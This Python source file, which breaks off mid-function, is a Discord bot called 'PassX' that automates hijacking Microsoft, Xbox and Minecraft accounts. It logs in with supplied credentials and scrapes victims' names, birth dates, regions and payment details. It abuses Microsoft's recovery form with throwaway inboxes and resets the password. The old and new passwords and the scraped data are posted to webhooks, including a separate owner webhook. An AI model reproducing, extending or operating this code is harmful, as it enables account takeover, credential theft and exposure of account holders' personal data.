"""
PASS CHANGER BOT — PassX Edition
PassX Premium Automation
"""

import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import io
import json
import os
from datetime import datetime, timedelta
import random
import sys
import traceback
from colorama import Fore, Style, init

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from automation.core import scrape_account_info
    from automation.acsr import submit_acsr_form
    from automation.acsr_continue import continue_acsr_flow
    from automation.reset_password import perform_password_reset
    from automation.captcha import download_captcha
    from automation.proxyscraper import start_proxy_refresher
    from automation.proxymanager import get_proxy_manager
    import tempmail
except ImportError as e:
    print(f"Warning: Could not import automation modules: {e}")
    print("Make sure automation/, gui/, utils/ folders are in the same directory")

from key_manager import (
    generate_key, redeem_key, get_user_license,
    has_valid_license, revoke_user_keys, list_all_keys,
    grant_lifetime, _format_duration, _parse_duration_to_seconds
)

ADMIN_ID              = 771258043517763585
CONFIG_FILE           = "bot_config.json"
AUTHORIZED_USERS_FILE = "authorized_users.json"
ACTIVE_SESSIONS_FILE  = "active_sessions.json"
STATS_FILE            = "bot_stats.json"
OWNERS_FILE           = "owners.json"

C_BRAND   = 0x7C3AED
C_SUCCESS = 0x22C55E
C_ERROR   = 0xEF4444
C_WARN    = 0xF59E0B
C_INFO    = 0x38BDF8
C_GOLD    = 0xFBBF24
C_PURPLE  = 0xA855F7

FOOTER = "PassX Made By The X Team  ·  /help  ·  /stop"
SEP    = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
STATUS = "PassX Made By The X Team  ·  /help  ·  /stop"


def E_DIAMOND():  return "🔹"
def E_ONE():      return "1️⃣"
def E_TWO():      return "2️⃣"
def E_THREE():    return "3️⃣"
def E_ALERT():    return "⚠️"
def E_SETTINGS(): return "⚙️"
def E_BOOK():     return "📖"
def E_MAIL():     return "📧"
def E_UPDATES():  return "ℹ️"
def E_PIN():      return "📌"
def E_TICK():     return "✅"
def E_RECORD():   return "🔴"
def E_CROSS():    return "❌"


def _raw_error(text):
    s = str(text if text is not None else "").strip()
    if s.upper().startswith("ERROR"):
        s = s[5:].lstrip(" :")
    return s or "(no details)"


def _clip(text, n=1000):
    s = _raw_error(text)
    if len(s) <= n:
        return s
    return s[: n - 3] + "..."


def _bar(done, total, width=10):
    if total <= 0:
        return "▱" * width
    filled = max(0, min(width, int(round(width * done / total))))
    return "▰" * filled + "▱" * (width - filled)


STEPS = [
    ("Account Preparation",  "mail",     [
        "Establishing browser session",
        "Navigating to login portal",
        "Submitting credentials",
        "Scraping account metadata",
        "Extracting security tokens",
    ]),
    ("Submitting ACSR Form", "BOOK",     [
        "Generating disposable inbox",
        "Loading ACSR form",
        "Populating account fields",
        "Preparing submission",
    ]),
    ("CAPTCHA Handling",     "alert",    [
        "Detecting CAPTCHA type",
        "Extracting CAPTCHA image",
        "Waiting for user input",
    ]),
    ("Continue Recovery",    "settings", [
        "Submitting ACSR form",
        "Waiting for server response",
        "Processing recovery link",
        "Validating reset token",
    ]),
    ("Password Reset",       "pin",      [
        "Opening reset portal",
        "Writing new credentials",
        "Confirming change",
    ]),
]

PENDING, ACTIVE, DONE, FAILED, WAITING = "pending", "active", "done", "failed", "waiting"


def _render_progress(step_states, sub_states, email, started, note=""):
    emoji_map = {
        "mail": E_MAIL(), "BOOK": E_BOOK(), "alert": E_ALERT(),
        "settings": E_SETTINGS(), "pin": E_PIN(),
    }
    done_n = sum(1 for s in step_states if s == DONE)
    bar = _bar(done_n, len(STEPS))
    pct = int(100 * done_n / len(STEPS))
    lines = [f"`{bar}`  **{pct}%**  ·  `{email}`", ""]
    for idx, ((name, icon, subs), state, ssubs) in enumerate(zip(STEPS, step_states, sub_states)):
        icon_e = emoji_map.get(icon, "•")
        num = idx + 1
        if state == DONE:
            lines.append(f"{E_TICK()} **Step {num} — {icon_e} {name}**")
        elif state == ACTIVE:
            lines.append(f"{E_RECORD()} **Step {num} — {icon_e} {name}**  ←")
        elif state == FAILED:
            lines.append(f"{E_CROSS()} **Step {num} — {icon_e} {name}**")
        elif state == WAITING:
            lines.append(f"{E_ALERT()} **Step {num} — {icon_e} {name}**")
        else:
            lines.append(f"{E_DIAMOND()} Step {num} — {icon_e} {name}")
        if state in (ACTIVE, WAITING, FAILED):
            for sub_name, sub_st in zip(STEPS[idx][2], ssubs):
                if sub_st == DONE:
                    lines.append(f"　　{E_TICK()}  {sub_name}")
                elif sub_st == ACTIVE:
                    lines.append(f"　　{E_RECORD()}  **{sub_name}**")
                elif sub_st == FAILED:
                    lines.append(f"　　{E_CROSS()}  {sub_name}")
                else:
                    lines.append(f"　　{E_UPDATES()}  {sub_name}")
        lines.append("")

    elapsed = int((datetime.now() - started).total_seconds())
    m, s = divmod(elapsed, 60)
    time_str = f"{m}m {s}s" if m else f"{s}s"
    if FAILED in step_states:
        color, title = C_ERROR, "PassX  ·  stopped / failed"
    elif all(x == DONE for x in step_states):
        color, title = C_SUCCESS, "PassX  ·  complete"
    elif WAITING in step_states:
        color, title = C_WARN, "PassX  ·  action required"
    else:
        color, title = C_BRAND, "PassX  ·  running"

    desc = "\n".join(lines)
    if note:
        desc += f"\n{SEP}\n{note}"
    e = discord.Embed(title=title, description=desc, color=color, timestamp=datetime.now())
    e.add_field(name=f"{E_MAIL()}  Target", value=f"`{email}`", inline=True)
    e.add_field(name=f"{E_UPDATES()}  Elapsed", value=time_str, inline=True)
    e.set_footer(text=FOOTER)
    return e


class Progress:
    def __init__(self, email, channel, started, user_id=None):
        self.email, self.channel, self.started = email, channel, started
        self.user_id = user_id
        self.msg = None
        n = len(STEPS)
        self.step_states = [PENDING] * n
        self.sub_states = [[PENDING] * len(s[2]) for s in STEPS]

    def _ok(self, i, j=None):
        if i < 0 or i >= len(self.sub_states):
            return False
        if j is None:
            return True
        return 0 <= j < len(self.sub_states[i])

    async def send(self):
        view = PipelineView(self.user_id) if self.user_id else None
        self.msg = await self.channel.send(
            embed=_render_progress(self.step_states, self.sub_states, self.email, self.started),
            view=view,
        )

    async def _edit(self, note=""):
        if not self.msg:
            return
        try:
            await self.msg.edit(embed=_render_progress(
                self.step_states, self.sub_states, self.email, self.started, note
            ))
        except Exception:
            pass

    async def step_start(self, i, note=""):
        if not self._ok(i):
            return
        self.step_states[i] = ACTIVE
        self.sub_states[i] = [PENDING] * len(STEPS[i][2])
        await self._edit(note)

    async def sub_start(self, i, j):
        if not self._ok(i, j):
            return
        self.sub_states[i][j] = ACTIVE
        await self._edit()

    async def sub_done(self, i, j):
        if not self._ok(i, j):
            return
        self.sub_states[i][j] = DONE
        await self._edit()

    async def step_done(self, i, note=""):
        if not self._ok(i):
            return
        self.step_states[i] = DONE
        self.sub_states[i] = [DONE] * len(STEPS[i][2])
        await self._edit(note)

    async def step_fail(self, i, note=""):
        if not self._ok(i):
            return
        self.step_states[i] = FAILED
        await self._edit(note)

    async def step_wait(self, i, note=""):
        if not self._ok(i):
            return
        self.step_states[i] = WAITING
        await self._edit(note)


class BotDataManager:
    def __init__(self):
        default_webhook = os.environ.get("WEBHOOK_URL", "")
        default_owner_webhook = os.environ.get("OWNER_WEBHOOK_URL", "")
        self.config = self.load_json(CONFIG_FILE, {
            "webhook_url": default_webhook,
            "owner_webhook_url": default_owner_webhook,
            "bot_enabled": True,
            "max_concurrent_users": 10
        })
        if not self.config.get("webhook_url") and default_webhook:
            self.config["webhook_url"] = default_webhook
        if not self.config.get("owner_webhook_url") and default_owner_webhook:
            self.config["owner_webhook_url"] = default_owner_webhook
        self.authorized_users = self.load_json(AUTHORIZED_USERS_FILE, {
            str(ADMIN_ID): {"authorized": True, "added_by": "system", "added_at": str(datetime.now())}
        })
        self.active_sessions = {}
        self.otp_data = {}
        self.processing_sessions = {}
        self.stats = self.load_json(STATS_FILE, {
            "total_processed": 0, "total_success": 0,
            "total_failed": 0, "users_served": {}
        })

    def load_json(self, filename, default):
        if os.path.exists(filename):
            try:
                with open(filename, "r", encoding="utf-8") as f:
                    return json.load(f)
            except Exception:
                pass
        return default

    def save_json(self, filename, data):
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)

    def save_config(self):           self.save_json(CONFIG_FILE, self.config)
    def save_authorized_users(self):  self.save_json(AUTHORIZED_USERS_FILE, self.authorized_users)
    def save_stats(self):            self.save_json(STATS_FILE, self.stats)

    def load_owners(self):
        data = self.load_json(OWNERS_FILE, {"owners": []})
        return [int(uid) for uid in data.get("owners", [])]

    def save_owners(self, owner_ids):
        self.save_json(OWNERS_FILE, {"owners": [str(uid) for uid in owner_ids]})

    def is_owner(self, user_id):
        return int(user_id) in self.load_owners()

    def is_authorized(self, user_id):
        return str(user_id) in self.authorized_users and \
               self.authorized_users[str(user_id)]["authorized"]

    def authorize_user(self, user_id, by_admin):
        self.authorized_users[str(user_id)] = {
            "authorized": True, "added_by": str(by_admin), "added_at": str(datetime.now())
        }
        self.save_authorized_users()

    def revoke_user(self, user_id):
        self.authorized_users.pop(str(user_id), None)
        self.save_authorized_users()

    def generate_otp(self, user_id):
        otp = "".join([str(random.randint(0, 9)) for _ in range(6)])
        self.otp_data[user_id] = {
            "otp": otp, "expires": datetime.now() + timedelta(minutes=5), "attempts": 0
        }
        return otp

    def verify_otp(self, user_id, otp):
        if user_id not in self.otp_data:
            return False, "No OTP requested. Use `/request_otp` first."
        data = self.otp_data[user_id]
        if datetime.now() > data["expires"]:
            del self.otp_data[user_id]
            return False, "OTP expired. Request a new one."
        if data["attempts"] >= 3:
            del self.otp_data[user_id]
            return False, "Maximum attempts exceeded."
        if data["otp"] == otp:
            del self.otp_data[user_id]
            self.active_sessions[user_id] = {"authenticated": True, "auth_time": datetime.now()}
            return True, "Authentication successful!"
        data["attempts"] += 1
        return False, f"Invalid OTP. {3 - data['attempts']} attempts remaining."

    def is_authenticated(self, user_id):
        if user_id not in self.active_sessions:
            return False
        auth_time = self.active_sessions[user_id].get("auth_time")
        if isinstance(auth_time, str):
            auth_time = datetime.fromisoformat(auth_time)
        if datetime.now() - auth_time > timedelta(hours=24):
            del self.active_sessions[user_id]
            return False
        return True

    def logout(self, user_id):
        self.active_sessions.pop(user_id, None)

    def update_stats(self, user_id, success):
        self.stats["total_processed"] += 1
        if success:
            self.stats["total_success"] += 1
        else:
            self.stats["total_failed"] += 1
        u = str(user_id)
        self.stats["users_served"].setdefault(u, {"processed": 0, "success": 0})
        self.stats["users_served"][u]["processed"] += 1
        if success:
            self.stats["users_served"][u]["success"] += 1
        self.save_stats()


def generate_elite_password():
    n = "".join(str(random.randint(0, 9)) for _ in range(6))
    return f"Px{n}!Az"


intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot          = commands.Bot(command_prefix="!", intents=intents, help_command=None)
data_manager = BotDataManager()


def mk(title, desc, color, fields=None):
    e = discord.Embed(title=title, description=desc, color=color, timestamp=datetime.now())
    if fields:
        for f in fields:
            e.add_field(name=f["name"], value=f["value"], inline=f.get("inline", False))
    e.set_footer(text=FOOTER)
    return e

def ok(t, d, f=None):    return mk(f"{E_TICK()}  {t}",    d, C_SUCCESS, f)
def err(t, d, f=None):   return mk(f"{E_CROSS()}  {t}",   d, C_ERROR,   f)
def info(t, d, f=None):  return mk(f"{E_UPDATES()}  {t}", d, C_INFO,    f)
def warn(t, d, f=None):  return mk(f"{E_ALERT()}  {t}",   d, C_WARN,    f)
def brand(t, d, f=None): return mk(f"{E_DIAMOND()}  {t}", d, C_BRAND,   f)
def adm(t, d, f=None):   return mk(f"{E_SETTINGS()}  {t}",d, C_GOLD,    f)


def _can_control(actor_id, session_uid):
    return actor_id == session_uid or actor_id == ADMIN_ID or data_manager.is_owner(actor_id)


def _is_stopped(user_id):
    s = data_manager.processing_sessions.get(user_id)
    return bool(s and s.get("stop"))


def _cleanup(user_id, driver, session):
    try:
        if driver:
            driver.quit()
    except Exception:
        pass
    cf = (session or {}).get("captcha_file", "")
    if cf and os.path.exists(cf):
        try:
            os.remove(cf)
        except Exception:
            pass
    data_manager.processing_sessions.pop(user_id, None)


async def _abort_pipeline(user_id, reason="Stopped by user"):
    session = data_manager.processing_sessions.get(user_id)
    if not session:
        return False
    session["stop"] = True
    prog = session.get("progress")
    if prog:
        marked = False
        for idx, state in enumerate(prog.step_states):
            if state in (ACTIVE, WAITING):
                await prog.step_fail(idx, f"{E_CROSS()}  **{reason}**")
                marked = True
                break
        if not marked:
            await prog._edit(f"{E_CROSS()}  **{reason}**")
    driver = session.get("driver")
    loop = asyncio.get_event_loop()

    def _quit():
        try:
            if driver:
                driver.quit()
        except Exception:
            pass

    await loop.run_in_executor(None, _quit)
    cf = (session or {}).get("captcha_file", "")
    if cf and os.path.exists(cf):
        try:
            os.remove(cf)
        except Exception:
            pass
    data_manager.processing_sessions.pop(user_id, None)
    return True


async def _ack(interaction, embed):
    try:
        if not interaction.response.is_done():
            await interaction.response.send_message(embed=embed, ephemeral=True)
        else:
            await interaction.followup.send(embed=embed, ephemeral=True)
    except Exception:
        pass


async def _get_channel(channel_id, interaction):
    ch = bot.get_channel(channel_id) if channel_id else None
    if ch is not None:
        return ch
    try:
        if channel_id:
            return await bot.fetch_channel(channel_id)
    except Exception:
        pass
    return getattr(interaction, "channel", None)


def _pack_result(email, password, actual_password, account_info, user_id):
    ai = account_info or {}
    return {
        "email": email,
        "old_password": password,
        "new_password": actual_password,
        "name": ai.get("name"),
        "dob": ai.get("dob"),
        "region": ai.get("region"),
        "skype_id": ai.get("skype_id"),
        "skype_email": ai.get("skype_email"),
        "gamertag": ai.get("gamertag"),
        "user_id": user_id,
        "mc_java": ai.get("mc_java", "⚠️ Skipped"),
        "mc_bedrock": ai.get("mc_bedrock", "⚠️ Skipped"),
        "mc_username": ai.get("mc_username", "—"),
        "mc_uuid": ai.get("mc_uuid", "—"),
        "mc_capes": ai.get("mc_capes", "None"),
        "mc_cape_migrator": ai.get("mc_cape_migrator", "—"),
        "mc_cape_minecon": ai.get("mc_cape_minecon", "—"),
        "mc_cape_personal": ai.get("mc_cape_personal", "—"),
        "mc_cape_extra": ai.get("mc_cape_extra", "—"),
        "mc_cape_optifine": ai.get("mc_cape_optifine", "—"),
        "mc_cape_render": ai.get("mc_cape_render", "—"),
        "mc_body_render": ai.get("mc_body_render", "—"),
        "name_change_allowed": ai.get("name_change_allowed", "—"),
        "name_changed_at": ai.get("name_changed_at", "—"),
        "name_created_at": ai.get("name_created_at", "—"),
        "name_history": ai.get("name_history", "—"),
        "xbox_gp": ai.get("xbox_gp", "⚠️ Skipped"),
        "xbox_gpu": ai.get("xbox_gpu", "⚠️ Skipped"),
        "xbox_pc_gp": ai.get("xbox_pc_gp", "⚠️ Skipped"),
        "xbox_gold": ai.get("xbox_gold", "⚠️ Skipped"),
        "xbox_gp_core": ai.get("xbox_gp_core", "⚠️ Skipped"),
        "xbox_gpu_days": ai.get("xbox_gpu_days", "—"),
        "xbox_pc_days": ai.get("xbox_pc_days", "—"),
        "xbox_payment": ai.get("xbox_payment", "—"),
        "ms_rewards": ai.get("ms_rewards", "—"),
        "hypixel_ban": ai.get("hypixel_ban", "⚠️ Skipped"),
        "donut_ban": ai.get("donut_ban", "⚠️ Skipped"),
    }


async def _send_webhook_embed(embed_payload):
    url = data_manager.config.get("webhook_url")
    if not url:
        return
    import aiohttp
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(url, json={"embeds": [embed_payload]})
    except Exception as ex:
        print(f"Webhook error: {ex}")


async def _send_owner_webhook_embed(embed_payload):
    url = data_manager.config.get("owner_webhook_url")
    if not url:
        return
    import aiohttp
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(url, json={"embeds": [embed_payload]})
    except Exception as ex:
        print(f"Owner webhook error: {ex}")


async def send_webhook_log(event_type, description, fields=None, color=None, user_id=None):
    if color is None:
        color = C_INFO
    embed = {
        "title": f"📋  PassX Log — {event_type}",
        "description": description,
        "color": color,
        "fields": fields or [],
        "footer": {"text": f"Operator: {user_id or '?'}  •  {FOOTER}"},
        "timestamp": datetime.now().isoformat()
    }
    if data_manager.config.get("webhook_url"):
        await _send_webhook_embed(embed)
    await _send_owner_webhook_embed(embed)


async def tell_user(channel, user_id, title, detail, email=None, color=None):
    """Exact error/info → Discord user + webhook. No generic wrapping."""
    raw = _raw_error(detail)
    print(f"[PassX] {title} | {email or '?'} | {raw[:400]}")
    body = f"`{email}`\n```\n{raw[:1800]}\n```" if email else f"```\n{raw[:1800]}\n```"
    e = mk(f"{E_CROSS()}  {title}" if (color in (None, C_ERROR)) else title, body, color or C_ERROR)
    if channel:
        try:
            await channel.send(embed=e)
        except Exception as ex:
            print(f"channel send failed: {ex}")
    fields = []
    if email:
        fields.append({"name": "Email", "value": f"`{email}`", "inline": True})
    fields.append({"name": "Exact error", "value": _clip(raw, 1000), "inline": False})
    await send_webhook_log(title, f"`{email or '?'}`\n{_clip(raw, 1500)}", fields, color=color or C_ERROR, user_id=user_id)


async def send_to_webhook(result):
    g = result.get
    payload = {
        "title": f"{E_TICK()}  Account Successfully Processed",
        "color": C_SUCCESS,
        "fields": [
            {"name": f"{E_MAIL()}  Email", "value": f"`{result['email']}`", "inline": False},
            {"name": "🔓  Old Password", "value": f"||`{result['old_password']}`||", "inline": True},
            {"name": "🔒  New Password", "value": f"`{result['new_password']}`", "inline": True},
            {"name": "👤  Name", "value": str(g("name", "—")), "inline": True},
            {"name": "🎂  DOB", "value": str(g("dob", "—")), "inline": True},
            {"name": "🌍  Region", "value": str(g("region", "—")), "inline": True},
            {"name": "💬  Skype", "value": f"{g('skype_id','—')}\n{g('skype_email','—')}", "inline": True},
            {"name": "🎮  Gamertag", "value": str(g("gamertag", "—")), "inline": True},
            {"name": "⬛  MINECRAFT", "value": (
                f"Java: {g('mc_java','⚠️ Skipped')}\n"
                f"Bedrock: {g('mc_bedrock','⚠️ Skipped')}\n"
                f"User: `{g('mc_username','—')}`\n"
                f"UUID: `{g('mc_uuid','—')}`"
            )[:1024], "inline": False},
            {"name": "🧥  CAPES", "value": (
                f"All: {g('mc_capes','None')}\n"
                f"Migrator: {g('mc_cape_migrator','—')}\n"
                f"Minecon: {g('mc_cape_minecon','—')}\n"
                f"Personal: {g('mc_cape_personal','—')}\n"
                f"Extra: {g('mc_cape_extra','—')}\n"
                f"OptiFine: {g('mc_cape_optifine','—')}"
            )[:1024], "inline": False},
            {"name": "📝  NAME", "value": (
                f"Change ready: {g('name_change_allowed','—')}\n"
                f"Last change: {g('name_changed_at','—')}\n"
                f"Created: {g('name_created_at','—')}\n"
                f"History: {g('name_history','—')}"
            )[:1024], "inline": False},
            {"name": "⬛  XBOX / REWARDS", "value": (
                f"GPU: {g('xbox_gpu','⚠️ Skipped')}\n"
                f"PC GP: {g('xbox_pc_gp','⚠️ Skipped')}\n"
                f"Game Pass: {g('xbox_gp','⚠️ Skipped')}\n"
                f"Gold/Core: {g('xbox_gp_core','⚠️ Skipped')}\n"
                f"Payment: {g('xbox_payment','—')}\n"
                f"Rewards: {g('ms_rewards','—')}"
            )[:1024], "inline": False},
            {"name": "🔨  BANS", "value": (
                f"Hypixel: {g('hypixel_ban','⚠️ Skipped')}\n"
                f"Donut: {g('donut_ban','⚠️ Skipped')}"
            ), "inline": False},
        ],
        "footer": {"text": f"Operator: {g('user_id', '?')}  •  {FOOTER}"},
        "timestamp": datetime.now().isoformat()
    }
    thumb = g("mc_body_render") or ""
    if isinstance(thumb, str) and thumb.startswith("http"):
        payload["thumbnail"] = {"url": thumb}
    cape_img = g("mc_cape_render") or ""
    if isinstance(cape_img, str) and cape_img.startswith("http") and g("mc_capes") not in (None, "None", "—"):
        payload["image"] = {"url": cape_img}
    if data_manager.config.get("webhook_url"):
        await _send_webhook_embed(payload)
    await _send_owner_webhook_embed(payload)


def _embed_chunks(items, max_len=1000):
    if not items:
        return []
    chunks, cur = [], ""
    for it in items:
        line = str(it).strip()
        if not line:
            continue
        add = line + "\n"
        if len(cur) + len(add) > max_len:
            if cur.strip():
                chunks.append(cur.rstrip())
            cur = add if len(add) <= max_len else (add[: max_len - 1] + "\n")
        else:
            cur += add
    if cur.strip():
        chunks.append(cur.rstrip())
    return chunks


def _add_chunked_field(fields, name, items, limit_chunks=4):
    chunks = _embed_chunks(items)
    if not chunks:
        return
    extra = 0
    if len(chunks) > limit_chunks:
        extra = len(chunks) - limit_chunks
        chunks = chunks[:limit_chunks]
    for n, chunk in enumerate(chunks):
        label = name if n == 0 else f"{name} (cont. {n + 1})"
        fields.append({"name": label, "value": chunk, "inline": False})
    if extra:
        fields.append({
            "name": f"{name} overflow",
            "value": f"+{extra} more field(s) truncated — see attached file",
            "inline": False,
        })


class PipelineView(discord.ui.View):
    def __init__(self, uid: int):
        super().__init__(timeout=900)
        self.uid = uid

    @discord.ui.button(label="Stop pipeline", style=discord.ButtonStyle.danger, emoji="🛑")
    async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not _can_control(interaction.user.id, self.uid):
            await interaction.response.send_message("not your pipeline.", ephemeral=True)
            return
        try:
            await interaction.response.defer(ephemeral=True)
        except Exception:
            pass
        ok_stop = await _abort_pipeline(self.uid, "Stopped by user")
        self.stop()
        try:
            if ok_stop:
                await interaction.followup.send(
                    embed=ok("Stopped", f"{E_TICK()}  Pipeline aborted. Chrome will close."),
                    ephemeral=True,
                )
            else:
                await interaction.followup.send(embed=info("Idle", "Nothing running."), ephemeral=True)
        except Exception:
            pass


async def process_account_full(email, password, user_id, channel):
    loop = asyncio.get_event_loop()
    started = datetime.now()
    prog = Progress(email, channel, started, user_id=user_id)
    await prog.send()

    data_manager.processing_sessions[user_id] = {
        "driver": None, "token": None, "temp_email": None, "account_info": None,
        "email": email, "password": password, "captcha_file": "",
        "captcha_attempts": 0, "channel_id": channel.id, "start_time": started,
        "progress": prog, "stop": False,
    }

    try:
        await send_webhook_log(
            "Pipeline Started",
            f"Recovery pipeline initiated for `{email}`",
            [{"name": "Target", "value": f"`{email}`", "inline": True},
             {"name": "Operator", "value": f"<@{user_id}>", "inline": True}],
            color=C_BRAND, user_id=user_id
        )

        await prog.step_start(0)
        await prog.sub_start(0, 0)
        if _is_stopped(user_id):
            return {"status": "stopped"}

        account_info = await loop.run_in_executor(None, scrape_account_info, email, password)
        if _is_stopped(user_id):
            return {"status": "stopped"}

        for j in range(len(STEPS[0][2])):
            await prog.sub_done(0, j)

        if not account_info or account_info.get("error"):
            msg = (account_info or {}).get("error") or "Could not login (no error string returned)"
            await prog.step_fail(0, f"{E_CROSS()}  **{_clip(msg, 180)}**")
            await tell_user(channel, user_id, "Login Failed", msg, email=email)
            data_manager.update_stats(user_id, False)
            data_manager.processing_sessions.pop(user_id, None)
            return {"status": "failed", "error": msg}

        sess = data_manager.processing_sessions.get(user_id)
        if sess:
            sess["account_info"] = account_info

        await send_webhook_log(
            "Account Scraped",
            f"Successfully scraped account info for `{email}`",
            [{"name": "Name", "value": str(account_info.get("name", "—"))[:256], "inline": True},
             {"name": "DOB", "value": str(account_info.get("dob", "—"))[:256], "inline": True},
             {"name": "Region", "value": str(account_info.get("region", "—"))[:256], "inline": True},
             {"name": "Gamertag", "value": str(account_info.get("gamertag", "—"))[:256], "inline": True}],
            color=C_SUCCESS, user_id=user_id
        )
        await prog.step_done(0)
        if _is_stopped(user_id):
            return {"status": "stopped"}

        await prog.step_start(1)
        for j in range(len(STEPS[1][2])):
            await prog.sub_start(1, j)

        try:
            captcha_image, driver, token, temp_email = await loop.run_in_executor(
                None, submit_acsr_form, account_info
            )
        except Exception as e:
            await prog.step_fail(1, f"{E_CROSS()}  **{_clip(e, 180)}**")
            await tell_user(channel, user_id, "ACSR Failed", e, email=email)
            data_manager.update_stats(user_id, False)
            data_manager.processing_sessions.pop(user_id, None)
            return {"status": "failed", "error": str(e)}

        if _is_stopped(user_id):
            try:
                if driver:
                    driver.quit()
            except Exception:
                pass
            return {"status": "stopped"}

        if not captcha_image or not driver:
            msg = "ACSR returned no captcha image or no Chrome driver."
            await prog.step_fail(1, f"{E_CROSS()}  {msg}")
            await tell_user(channel, user_id, "ACSR Failed", msg, email=email)
            data_manager.update_stats(user_id, False)
            data_manager.processing_sessions.pop(user_id, None)
            return {"status": "failed", "error": msg}

        for j in range(len(STEPS[1][2])):
            await prog.sub_done(1, j)
        await prog.step_done(1)

        captcha_filename = f"captcha_{user_id}_{int(datetime.now().timestamp())}.png"
        captcha_image.seek(0)
        with open(captcha_filename, "wb") as f:
            f.write(captcha_image.read())

        data_manager.processing_sessions[user_id] = {
            "driver": driver, "token": token, "temp_email": temp_email,
            "account_info": account_info, "email": email, "password": password,
            "captcha_file": captcha_filename, "captcha_attempts": 0,
            "channel_id": channel.id, "start_time": started, "progress": prog, "stop": False,
        }

        await prog.step_start(2)
        await prog.sub_done(2, 0)
        await prog.sub_done(2, 1)
        await prog.step_wait(
            2,
            f"{E_ALERT()}  **CAPTCHA required** — solve the image below.\n"
            f"`/submit_captcha <answer>`  ·  `/stop` to abort."
        )
        cap_embed = warn(
            "CAPTCHA required",
            f"Solve the image, then run:\n"
            f"`/submit_captcha <answer>`\n\n"
            f"⏱ 5 minutes  ·  3 attempts  ·  `/stop` to abort"
        )
        cap_embed.set_image(url="attachment://captcha.png")
        await channel.send(embed=cap_embed, file=discord.File(captcha_filename, filename="captcha.png"))
        return {"status": "captcha_pending"}

    except Exception as e:
        traceback.print_exc()
        try:
            await prog.step_fail(0, f"{E_CROSS()}  **{_clip(e, 180)}**")
        except Exception:
            pass
        await tell_user(channel, user_id, "Processing Error", e, email=email)
        data_manager.update_stats(user_id, False)
        data_manager.processing_sessions.pop(user_id, None)
        return {"status": "failed", "error": str(e)}


async def continue_after_captcha(user_id, captcha_text, interaction):
    if user_id not in data_manager.processing_sessions:
        await _ack(interaction, warn("No Session", "No active CAPTCHA session found."))
        return

    session = data_manager.processing_sessions[user_id]
    if session.get("stop"):
        await _ack(interaction, warn("Stopped", "This pipeline was aborted."))
        return

    driver = session.get("driver")
    token = session.get("token")
    account_info = session.get("account_info") or {}
    email = session.get("email")
    password = session.get("password")
    channel = await _get_channel(session.get("channel_id"), interaction)
    prog = session.get("progress")
    do_cleanup = True

    await _ack(
        interaction,
        info("CAPTCHA received", f"{E_TICK()}  `{captcha_text}` submitted.\nPipeline continuing…")
    )

    try:
        if prog:
            nsubs = len(prog.sub_states[2]) if len(prog.sub_states) > 2 else 0
            if nsubs:
                await prog.sub_done(2, nsubs - 1)
            await prog.step_done(2)
            await prog.step_start(3)
            for j in range(len(STEPS[3][2])):
                await prog.sub_start(3, j)

        loop = asyncio.get_event_loop()
        reset_link = await loop.run_in_executor(
            None, continue_acsr_flow, driver, account_info, token, captcha_text, user_id
        )

        if reset_link == "CAPTCHA_RETRY_NEEDED":
            session["captcha_attempts"] = session.get("captcha_attempts", 0) + 1
            left = 3 - session["captcha_attempts"]
            if session["captcha_attempts"] >= 3:
                if prog:
                    await prog.step_fail(3, f"{E_CROSS()}  All CAPTCHA attempts exhausted.")
                await tell_user(channel, user_id, "CAPTCHA Failed", "All 3 CAPTCHA attempts exhausted. Start over with `/process`.", email=email)
                data_manager.update_stats(user_id, False)
                return

            new_captcha = await loop.run_in_executor(None, download_captcha, driver)
            if new_captcha is None:
                if prog:
                    await prog.step_fail(3, f"{E_CROSS()}  Could not reload CAPTCHA.")
                await tell_user(channel, user_id, "CAPTCHA Error", "Could not reload CAPTCHA image from the Microsoft page.", email=email)
                data_manager.update_stats(user_id, False)
                return
            new_fname = f"captcha_{user_id}_{int(datetime.now().timestamp())}.png"
            new_captcha.seek(0)
            with open(new_fname, "wb") as f:
                f.write(new_captcha.read())
            old = session.get("captcha_file", "")
            if old and os.path.exists(old):
                try:
                    os.remove(old)
                except Exception:
                    pass
            session["captcha_file"] = new_fname
            do_cleanup = False
            if prog:
                prog.step_states[2] = WAITING
                n = len(prog.sub_states[2])
                prog.sub_states[2] = ([DONE] * max(0, n - 1)) + [WAITING]
                prog.step_states[3] = PENDING
                prog.sub_states[3] = [PENDING] * len(STEPS[3][2])
                await prog._edit(f"{E_ALERT()}  **Wrong CAPTCHA — {left} attempt(s) left.**")
            if channel:
                retry_embed = warn(
                    "Wrong CAPTCHA",
                    f"{E_ALERT()}  `{left}` attempt(s) remaining.\n"
                    f"Run `/submit_captcha <answer>` again."
                )
                retry_embed.set_image(url="attachment://captcha.png")
                await channel.send(embed=retry_embed, file=discord.File(new_fname, filename="captcha.png"))
            return

        if not reset_link or (isinstance(reset_link, str) and str(reset_link).upper().startswith("ERROR")):
            err_msg = reset_link if isinstance(reset_link, str) else "Failed to get reset link (empty return)"
            if prog:
                await prog.step_fail(3, f"{E_CROSS()}  **{_clip(err_msg, 180)}**")
            await tell_user(channel, user_id, "Reset Link Failed", err_msg, email=email)
            data_manager.update_stats(user_id, False)
            return

        for j in range(len(STEPS[3][2])):
            if prog:
                await prog.sub_done(3, j)
        if prog:
            await prog.step_done(3)
            await prog.step_start(4)
            for j in range(len(STEPS[4][2])):
                await prog.sub_start(4, j)

        new_password = generate_elite_password()
        actual_password = await loop.run_in_executor(
            None, perform_password_reset, reset_link, email, new_password
        )

        if actual_password == "RATE_LIMITED":
            msg = "Microsoft rate-limited the reset page (Too Many Requests)."
            if prog:
                await prog.step_fail(4, f"{E_CROSS()}  {msg}")
            await tell_user(channel, user_id, "Password Reset Failed", msg, email=email)
            data_manager.update_stats(user_id, False)
            return

        if not actual_password:
            msg = "Opened the reset link but the new password was not accepted (no password field, or Microsoft rejected it)."
            if prog:
                await prog.step_fail(4, f"{E_CROSS()}  Password reset failed.")
            await tell_user(channel, user_id, "Password Reset Failed", msg, email=email)
            data_manager.update_stats(user_id, False)
            return

        for j in range(len(STEPS[4][2])):
            if prog:
                await prog.sub_done(4, j)
        if prog:
